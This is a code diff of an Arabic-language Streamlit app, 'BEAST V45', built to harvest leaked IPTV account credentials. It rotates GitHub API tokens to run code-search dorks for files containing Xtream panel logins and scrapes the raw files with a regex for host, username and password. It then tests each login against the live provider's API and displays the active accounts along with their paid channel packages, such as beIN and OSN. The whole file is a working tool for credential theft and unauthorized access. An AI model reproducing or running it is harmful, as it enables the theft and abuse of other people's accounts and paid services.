@@ -2,19 +2,17 @@ import streamlit as st
 import requests
 import re
 import time
-from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor, as_completed
 import random
+from datetime import datetime, timedelta
+from concurrent.futures import ThreadPoolExecutor
 
 # --- إعدادات الواجهة ---
-st.set_page_config(page_title="BEAST V44 - DUAL ENGINE", layout="wide")
+st.set_page_config(page_title="BEAST V45 - ARABIC CHAMELEON", layout="wide")
 
 if "auth" not in st.session_state: st.session_state.auth = False
-if "hits" not in st.session_state: st.session_state.hits = []
 
-# نظام الدخول
 if not st.session_state.auth:
-    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V44 - DUAL ENGINE</h1>", unsafe_allow_html=True)
+    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🎭 BEAST V45 - ARABIC CHAMELEON</h1>", unsafe_allow_html=True)
     pwd = st.text_input("Password:", type="password")
     if st.button("دخول"):
         if pwd == "BEAST_V17_PRO":
@@ -22,141 +20,130 @@ if not st.session_state.auth:
             st.rerun()
     st.stop()
 
-# تنسيق الألوان (ثيم الهكر المعتاد)
+# تنسيق متطور
 st.markdown("""
 <style>
-    .stApp { background-color: #000; }
-    .scan-log { color: #00d4ff; font-family: monospace; font-size: 12px; margin: 0; }
-    .active-hit {
-        background: #0d1117; border: 1px solid #00ff41;
-        padding: 12px; border-radius: 5px; margin-bottom: 8px;
+    .stApp { background-color: #050505; }
+    .hit-card {
+        background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
+        border: 1px solid #30363d; border-right: 4px solid #00ff41;
+        padding: 20px; border-radius: 10px; margin-bottom: 15px;
+    }
+    .package-tag {
+        background: #1f2937; color: #00d4ff; padding: 2px 8px; 
+        border-radius: 5px; font-size: 11px; margin-right: 5px; border: 1px solid #333;
     }
     .text-green { color: #00ff41; font-weight: bold; }
-    .text-yellow { color: #fbbf24; }
+    .text-white { color: #e6edf3; font-family: monospace; }
 </style>
 """, unsafe_allow_html=True)
 
 # --- القائمة الجانبية ---
 with st.sidebar:
-    st.title("⚡ BEAST V44")
+    st.title("🛡️ BEAST V45")
+    tokens_raw = st.text_area("Tokens List:", height=100)
+    tokens = [t.strip() for t in tokens_raw.split('\n') if t.strip()]
     
-    # خيار اختيار طريقة البحث
-    search_method = st.selectbox("اختر طريقة البحث:", 
-                                 ["الطريقة الأولى: صفحات لانهائية", 
-                                  "الطريقة الثانية: الهجوم السريع (Multi-Token)"])
+    st.divider()
+    freshness = st.selectbox("تاريخ الرفع (لضمان سيرفرات جديدة):", 
+                             ["كل الأوقات", "آخر 24 ساعة", "آخر أسبوع", "آخر شهر"])
     
-    tokens_raw = st.text_area("أدخل التوكنات (واحد في كل سطر):", height=120)
-    tokens_list = [t.strip() for t in tokens_raw.split('\n') if t.strip()]
-    
-    max_workers = st.slider("سرعة الخيوط (Threads):", 10, 100, 30)
-    
-    if search_method == "الطريقة الأولى: صفحات لانهائية":
-        st.info("هذه الطريقة تفحص كل الصفحات المتاحة لدروك معين حتى النهاية.")
-    else:
-        st.info("هذه الطريقة تستخدم التوكنات للقفز بين الدروكات بسرعة فائقة.")
+    threads = st.slider("سرعة الفحص:", 5, 50, 25)
+    start = st.button("🚀 إطلاق رادار البحث العربي")
 
-    start = st.button("🚀 إطلاق الهجوم")
-    if st.button("🗑️ مسح النتائج"):
-        st.session_state.hits = []
-        st.rerun()
-
-# مناطق العرض
-radar_area = st.empty()
-st.subheader(f"🏆 النتائج المستخرجة ({len(st.session_state.hits)})")
-hits_container = st.container()
-
-# --- وظائف المساعدة ---
-def check_server(host, user, pw):
+# --- المحرك الذكي ---
+def get_categories(host, user, pw):
+    """جلب أسماء الباقات والقنوات من السيرفر"""
     try:
-        api = f"{host}/player_api.php?username={user}&password={pw}"
-        r = requests.get(api, timeout=3).json()
-        if r.get("user_info", {}).get("status") == "Active":
-            return {"host": host, "user": user, "pw": pw, "exp": r['user_info'].get('exp_date')}
-    except: return None
-    return None
+        url = f"{host}/player_api.php?username={user}&password={pw}&action=get_live_categories"
+        res = requests.get(url, timeout=3).json()
+        if isinstance(res, list):
+            # جلب أول 8 باقات كمثال
+            return [cat['category_name'] for cat in res[:8]]
+    except: return []
+    return []
 
-def extract_from_content(content):
-    pattern = r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)"
-    return re.findall(pattern, content)
-
-# --- قائمة الدروكات الضخمة ---
-mega_dorks = [
-    'extension:txt "get.php?username=" "password="',
-    'extension:m3u "player_api.php"',
-    'extension:php "panel_api.php"',
-    'extension:env "XTREAM_USER"',
-    'extension:json "server_url" "password"',
-    'extension:log "http://" "username="',
-    '"beIN" "get.php?username="',
-    '"SSC" "player_api.php"',
-    '"OSN" "password=" "http"',
-    'extension:m3u8 "username=" "password="'
-]
-
-# --- المحرك الرئيسي ---
-if start and tokens_list:
-    token_idx = 0
+def search_logic(token, dork, page):
+    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
+    # إضافة فلتر التاريخ للبحث لضمان نتائج متجددة
+    date_filter = ""
+    if freshness == "آخر 24 ساعة":
+        date_filter = f" pushed:>{(datetime.now() - timedelta(days=1)).strftime('%Y-%m-%d')}"
+    elif freshness == "آخر أسبوع":
+        date_filter = f" pushed:>{(datetime.now() - timedelta(days=7)).strftime('%Y-%m-%d')}"
     
-    for dork in mega_dorks:
-        page = 1
-        max_p = 100 if search_method == "الطريقة الأولى: صفحات لانهائية" else 10
-        
-        while page <= max_p:
-            current_token = tokens_list[token_idx % len(tokens_list)]
-            headers = {'Authorization': f'token {current_token}', 'Accept': 'application/vnd.github.v3+json'}
+    try:
+        url = f"https://api.github.com/search/code?q={dork}{date_filter}&page={page}&per_page=50&sort=indexed"
+        res = requests.get(url, headers=headers, timeout=10).json()
+        return res.get('items', [])
+    except: return []
+
+# --- التنفيذ ---
+if start and tokens:
+    # دروكات مركزة على المحتوى العربي والسيرفرات الضخمة
+    arabic_keywords = ["beIN", "SSC", "OSN", "Nilesat", "Shahid", "VIP", "MYHD"]
+    base_dorks = [
+        'extension:txt "get.php?username=" "password="',
+        'extension:m3u "player_api.php"',
+        'extension:php "panel_api.php"',
+        'extension:env "XTREAM_USER"'
+    ]
+    
+    # خلط الدروكات بالكلمات العربية لزيادة التنوع
+    final_dorks = []
+    for d in base_dorks:
+        final_dorks.append(f"{d} {random.choice(arabic_keywords)}")
+    random.shuffle(final_dorks)
+
+    found_count = 0
+    t_idx = 0
+    
+    st.subheader("📡 الرادار يبحث الآن عن محتوى عربي طازج...")
+    hits_area = st.container()
+
+    for dork in final_dorks:
+        # اختيار صفحات عشوائية لكسر التكرار
+        start_page = random.randint(1, 5)
+        for page in range(start_page, start_page + 10):
+            current_token = tokens[t_idx % len(tokens)]
+            items = search_logic(current_token, dork, page)
             
-            try:
-                # محاكاة تأخير بسيط لتفادي الحظر
-                time.sleep(random.uniform(0.5, 1.2))
-                
-                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
-                res = requests.get(search_url, headers=headers)
-                
-                if res.status_code == 403: # التوكن يحتاج راحة
-                    token_idx += 1
-                    if search_method == "الطريقة الأولى: صفحات لانهائية":
-                        radar_area.warning("Rate Limit! switching token...")
-                        time.sleep(5)
-                    continue
-
-                data = res.json().get('items', [])
-                if not data: break # لا توجد نتائج أخرى لهذا الدروك
-
-                radar_area.info(f"🔎 Engine: {search_method} | Dork: {dork[:30]} | Page: {page}")
-
-                raw_urls = [item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/') for item in data]
-
-                # فحص متوازي سريع
-                with ThreadPoolExecutor(max_workers=max_workers) as executor:
-                    for url in raw_urls:
-                        try:
-                            content = requests.get(url, timeout=3).text
-                            creds = extract_from_content(content)
-                            
-                            for h, u, p in creds:
-                                radar_area.markdown(f"<p class='scan-log'>🔄 Checking: {h}</p>", unsafe_allow_html=True)
-                                
-                                # فحص السيرفر
-                                result = check_server(h, u, p)
-                                if result and result not in st.session_state.hits:
-                                    st.session_state.hits.append(result)
-                                    with hits_container:
-                                        st.markdown(f"""
-                                        <div class="active-hit">
-                                            <span class="text-green">✅ HIT #{len(st.session_state.hits)}</span><br>
-                                            <span style="color:#fff;">HOST: {result['host']}</span><br>
-                                            <span class="text-yellow">USER: {result['user']} | PASS: {result['pw']}</span><br>
-                                            <small style="color:#888;">Expiry: {result['exp']}</small>
-                                        </div>
-                                        """, unsafe_allow_html=True)
-                        except: continue
-
-                page += 1
-                if search_method == "الطريقة الثانية: الهجوم السريع (Multi-Token)":
-                    break # في الطريقة الثانية ننتقل للدروك التالي فوراً بعد أول صفحة لضمان التنوع
-
-            except:
-                token_idx += 1
+            if not items:
+                t_idx += 1
                 continue
 
-    st.success("🎉 اكتملت المهمة بنجاح!")
+            for item in items:
+                raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
+                try:
+                    content = requests.get(raw_url, timeout=3).text
+                    matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
+                    
+                    for host, user, pw in matches:
+                        try:
+                            # فحص السيرفر
+                            check_api = f"{host}/player_api.php?username={user}&password={pw}"
+                            r = requests.get(check_api, timeout=3).json()
+                            
+                            if r.get("user_info", {}).get("status") == "Active":
+                                found_count += 1
+                                # جلب الباقات
+                                cats = get_categories(host, user, pw)
+                                
+                                with hits_area:
+                                    st.markdown(f"""
+                                    <div class="hit-card">
+                                        <div style="display:flex; justify-content:space-between;">
+                                            <span class="text-green">✅ سيرفر عربي نشط #{found_count}</span>
+                                            <span style="color:#888; font-size:12px;">تاريخ الانتهاء: {r['user_info'].get('exp_date')}</span>
+                                        </div>
+                                        <code class="text-white" style="display:block; margin:10px 0; background:#000; padding:5px;">{host}/get.php?username={user}&password={pw}&type=m3u_plus</code>
+                                        <div style="margin-top:10px;">
+                                            <b style="font-size:12px; color:#fbbf24;">📦 أهم الباقات المتوفرة:</b><br>
+                                            <div style="margin-top:5px;">
+                                                {" ".join([f'<span class="package-tag">{c}</span>' for c in cats]) if cats else "باقات عامة"}
+                                            </div>
+                                        </div>
+                                    </div>
+                                    """, unsafe_allow_html=True)
+                        except: continue
+                except: continue
